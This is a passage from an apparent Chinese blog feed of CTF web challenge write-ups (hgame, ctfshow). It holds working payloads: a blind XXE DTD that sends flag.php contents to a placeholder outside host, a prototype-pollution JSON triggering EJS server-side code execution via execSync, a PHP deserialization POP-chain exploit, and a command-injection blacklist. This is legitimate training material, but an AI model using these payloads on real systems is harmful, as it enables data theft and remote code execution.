class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, message=mes)</span><br><span class="line">        res = os.system(<span class="string">&quot;ping -c 5 -w 15 &quot;</span> + ip)</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">if</span> res == <span class="number">0</span>:</span><br><span class="line">            mes = <span class="string">&quot;Success&quot;</span></span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, message=mes)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            mes = <span class="string">&quot;Failed&quot;</span></span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, message=mes)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">ip</span>):</span><br><span class="line">    blacklist = [<span class="string">&quot;;&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;cd&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot;tac&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;\+&quot;</span>, <span class="string">&quot;echo&quot;</span>, <span class="string">&quot;flag&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> blacklist:</span><br><span class="line">        match = re.search(black, ip, re.M | re.I)</span><br><span class="line">        <span class="built_in">print</span>(match)</span><br><span class="line">        <span class="keyword">if</span> match:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Gopher-Shop"><a href="#Gopher-Shop" class="headerlink" title="Gopher Shop"></a>Gopher Shop</h3><p>整数溢出，可以使用<code>2&lt;&lt;45</code></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/v1/user/buyProduct?product=Flag&amp;number=70368744177664</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>week-3.hgame.lwsec.cn:32018</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://week-3.hgame.lwsec.cn:32018/shop</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>_ga=GA1.1.41308100.1673534855; _ga_P1E9Z5LRRK=GS1.1.1673534854.1.1.1673536392.0.0.0; SESSION=MTY3NDY2NTg3MnxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBY0FCV0ZrYldsdXxekOjqNPPWh-9h9e_otzhkRGXPnOpeotEWZA1kkvwT2w==; session=MTY3NDY2OTc2N3xEdi1CQkFFQ180SUFBUkFCRUFBQUpfLUNBQUVHYzNSeWFXNW5EQW9BQ0hWelpYSnVZVzFsQm5OMGNtbHVad3dIQUFWaFpHMXBiZz09fGWqb-tXfvhtArGTKVpLiHKHSHtXFhQWeBmT8yg6aooa</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>购买成功后直接<code>Check Flag</code>即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;GopherShop_M@gic_1nt_0verflow&#125;</span><br></pre></td></tr></table></figure><h2 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h2><h3 id="Tell-Me"><a href="#Tell-Me" class="headerlink" title="Tell Me"></a>Tell Me</h3><p>访问<code>www.zip</code>获取源码，看下<code>send.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    </span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$xmldata</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$xmldata</span>))&#123;</span><br><span class="line">        <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmldata</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="string">&quot;loading xml data error&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$data</span>-&gt;name) || !<span class="keyword">isset</span>(<span class="variable">$data</span>-&gt;email) || !<span class="keyword">isset</span>(<span class="variable">$data</span>-&gt;content))&#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="string">&quot;name,email,content cannot be empty&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$data</span>-&gt;name &amp;&amp; <span class="variable">$data</span>-&gt;email &amp;&amp; <span class="variable">$data</span>-&gt;content)&#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="string">&quot;Success! I will see it later&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="string">&quot;Parse xml data error&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Request Method Not Allowed&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首行<code>libxml_disable_entity_loader(false);</code>可以看出有<code>xxe</code>漏洞，先部署下自己的<code>exp.dtd</code>(记得对<code>%</code>编码一下)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=flag.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % print &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://xxx.xxx.xx.xx:xxxxxxx/?c=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>然后打</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://xxx.xxx.xx.xx/exp.dtd&quot;&gt;</span><br><span class="line">%dtd;%print;%send;]&gt;</span><br></pre></td></tr></table></figure><p>发现<code>flag</code></p><p><img src="https://cdnjson.com/images/2023/02/05/tellme.png" alt="tellme.png"></p><p>解码一下即可</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$flag1</span> = <span class="string">&quot;hgame&#123;Be_Aware_0f_XXeBl1nd1njecti0n&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Shared-Diary"><a href="#Shared-Diary" class="headerlink" title="Shared Diary"></a>Shared Diary</h3><p>传<code>json</code>给<code>login</code>获取<code>session</code></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;client&quot;</span><span class="punctuation">:</span><span class="keyword">true</span><span class="punctuation">,</span><span class="attr">&quot;escapeFunction&quot;</span><span class="punctuation">:</span><span class="string">&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;);&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;compileDebug&quot;</span><span class="punctuation">:</span><span class="keyword">true</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>然后用得到的<code>session</code>去<code>POST</code>请求<code>\</code>即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session=s%3AHHwyaFtboARnsQI0PO6-9LJ9nrxBLQ-S.%2FdYHGGiw8Q3FhBzWW0ZZ7Y%2FhVCq%2BuMbczIqvEePmWtY;</span><br></pre></td></tr></table></figure><p>最后得到<code>flag</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;N0tice_prototype_pollution&amp;&amp;EJS_server_template_injection&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> hgame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-年ctf-web题解</title>
      <link href="/2023/01/28/ctfshow-nianctf-web/"/>
      <url>/2023/01/28/ctfshow-nianctf-web/</url>
      
        <content type="html"><![CDATA[<h2 id="ctfshow-年CTF-web题解"><a href="#ctfshow-年CTF-web题解" class="headerlink" title="ctfshow 年CTF web题解"></a>ctfshow 年CTF web题解</h2><h3 id="除夕"><a href="#除夕" class="headerlink" title="除夕"></a>除夕</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-01-18 11:36:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-01-19 10:18:44</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$year</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;year&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$year</span>==<span class="number">2022</span> &amp;&amp; <span class="variable">$year</span>+<span class="number">1</span>!==<span class="number">2023</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>弱类型比较</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?year=2022.e</span><br></pre></td></tr></table></figure><h3 id="初三"><a href="#初三" class="headerlink" title="初三"></a>初三</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-01-19 10:31:36</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-01-19 13:11:08</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$__</span>,<span class="variable">$___</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$__</span>==<span class="variable">$___</span>?<span class="variable">$___</span>:<span class="variable">$__</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$$__</span>(<span class="variable">$_</span>(<span class="variable">$_GET</span>&#123;</span><br><span class="line">    <span class="variable">$___</span></span><br><span class="line">&#125;[<span class="variable">$____</span>]&#123;</span><br><span class="line">    <span class="variable">$_____</span></span><br><span class="line">&#125;(),<span class="variable">$flag</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>构造出<code>var_dump($_(phpinfo(),$flag))</code>即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?__=a&amp;a=var_dump&amp;___=b&amp;c[2]=phpinfo&amp;b[1][2]=phpinfo&amp;____=1&amp;_____=2</span><br></pre></td></tr></table></figure><h3 id="初六"><a href="#初六" class="headerlink" title="初六"></a>初六</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-01-18 08:46:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-01-18 11:19:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">happy2year</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$argv</span></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;key, <span class="keyword">array</span>(<span class="variable">$method</span>,<span class="variable">$argv</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getSecret</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$key</span>=<span class="variable">$key</span>?<span class="variable">$key</span>:<span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">createSecret</span>(<span class="variable">$key</span>);    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createSecret</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$this</span>-&gt;key.<span class="variable">$this</span>-&gt;secret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$arg</span>=<span class="string">&quot;get&quot;</span>.<span class="variable">$arg</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$arg</span> = <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg</span>,<span class="variable">$argv</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$arg</span>.<span class="variable">$argv</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$secret</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">secret</span>().<span class="variable">$this</span>-&gt;secret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$data</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line"><span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$obj</span>)&#123;</span><br><span class="line">    <span class="variable">$secret</span> = <span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">getSecret</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;你提交的key是&quot;</span>.<span class="variable">$key</span>.<span class="string">&quot;\n生成的secret是&quot;</span>.<span class="variable">$secret</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当两个变量用<code>.</code>连接时，也会触发<code>toString</code>方法，故利用链如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getSecret -&gt; createSecret -&gt; __toString(有个secret()) -&gt; __call(第一个参数当作函数调用) -&gt; __invoke($secret可以使得访问类中不存在变量) -&gt; __get</span><br></pre></td></tr></table></figure><p><code>exp</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">happy2year</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$secret</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span> = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">happy2year</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;key = <span class="keyword">new</span> <span class="title function_ invoke__">happy2year</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;key-&gt;key = <span class="keyword">new</span> <span class="title function_ invoke__">happy2year</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)).PHP_EOL;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用该<code>payload</code>访问页面即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST：</span><br><span class="line">data=O%3A10%3A%22happy2year%22%3A2%3A%7Bs%3A6%3A%22secret%22%3Bs%3A3%3A%22123%22%3Bs%3A3%3A%22key%22%3BO%3A10%3A%22happy2year%22%3A2%3A%7Bs%3A6%3A%22secret%22%3Bs%3A3%3A%22123%22%3Bs%3A3%3A%22key%22%3BO%3A10%3A%22happy2year%22%3A2%3A%7Bs%3A6%3A%22secret%22%3Bs%3A3%3A%22123%22%3Bs%3A3%3A%22key%22%3Bs%3A3%3A%22abc%22%3B%7D%7D%7D&amp;key=def</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> ctfshow </tag>
            
            <tag> 年CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow Web入门 刷题记录 1</title>
      <link href="/2022/12/22/ctfshow-web1/"/>
      <url>/2022/12/22/ctfshow-web1/</url>
      
        <content type="html"><![CDATA[<h1 id="ctfshow-Web入门刷题记录1"><a href="#ctfshow-Web入门刷题记录1" class="headerlink" title="ctfshow-Web入门刷题记录1"></a>ctfshow-Web入门刷题记录1</h1><blockquote><p>参考：</p><p><a href="https://www.wlhhlc.top/posts/14827/">ctfshow-Web1000题系列修炼(一)</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/109197158">CTFSHOW PHP特性篇 （下篇132-150）</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）</a></p></blockquote><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>查看源码</p><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p><code>view-source:</code></p><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p>抓包，在响应包发现<code>Flag: ctfshow&#123;b5a5badc-46c5-4c2c-ad28-174f21781454&#125;</code></p><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/robots.txt</span><br><span class="line">/flagishere.txt</span><br></pre></td></tr></table></figure><h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p><code>/index.php</code></p><h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p><code>/www.zip</code></p><h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p><code>/.git/</code></p><h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><p><code>/.svn/</code></p><h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><p><code>/index.php.swp</code></p><h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><p>对<code>Cookie</code>中<code>flag</code>字段进行<code>URL</code>解码即可</p><h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><p>在<a href="http://dbcha.com/">域名解析查询</a>选定<code>txt</code>分类对<code>flag.ctfshow.com</code>进行查询即可</p><h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><p>页面最底部发现<code>Help Line Number : 372619038</code></p><p>访问<code>\admin</code>并使用<code>admin/372619038</code>即可登录</p><h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h3><p>点击页面底部的<code>INFORMATION</code>分栏中最下面的<code>document</code></p><h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><p>查看源码搜索<code>editor</code></p><p>访问<code>/editor/</code>，选择<code>图片</code>中的<code>网络图片</code>中的<code>图片空间</code></p><p>发现<code>/editor/attached/image/var/www/html/nothinghere/fl000g.txt</code></p><p>访问<code>/nothinghere/fl000g.txt</code>即可</p><h3 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h3><p>在最底部发现<code>1156631961@qq.com</code>，搜索<code>QQ</code>后发现居住在<code>西安</code></p><p>访问<code>\admin</code>，点击重置密码输入对应城市即可重置密码</p><p>使用<code>admin/admin7789</code>登录即可</p><h3 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h3><p>访问<code>/tz.php</code>，在<code>PHP相关参数</code>中发现<code>PHPINFO</code>，点击后跳转至<code>/tz.php?act=phpinfo</code>，搜索<code>ctfshow</code>即可</p><h3 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h3><p>在源码中发现<code>var result=window.confirm(&quot;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b&quot;);</code></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b&#x27;</span>)</span><br><span class="line"><span class="comment">//你赢了，去幺幺零点皮爱吃皮看看</span></span><br></pre></td></tr></table></figure><p>访问<code>/110.php</code></p><h3 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>查看源码发现</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    &lt;!--</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span 